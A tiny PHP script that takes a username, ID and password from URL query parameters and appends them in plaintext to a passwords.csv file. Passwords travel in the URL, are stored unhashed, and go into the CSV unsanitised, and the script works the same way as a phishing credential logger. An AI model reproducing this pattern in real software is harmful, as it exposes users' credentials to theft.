<!DOCTYPE html public "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/tr/HTML401/loose.dtd">
<?php

$l = 0; #inital state of login success
$uname = trim($_GET["u"]);
$passId = trim($_GET["p"]);
$pwd = trim($_GET["pwd"]);
print 'a';
#save new username and password
$file = fopen("passwords.csv","a");
$s =$passId.",".$uname.",".$pwd."\n";
fwrite($file,$s);
fclose($file);


?>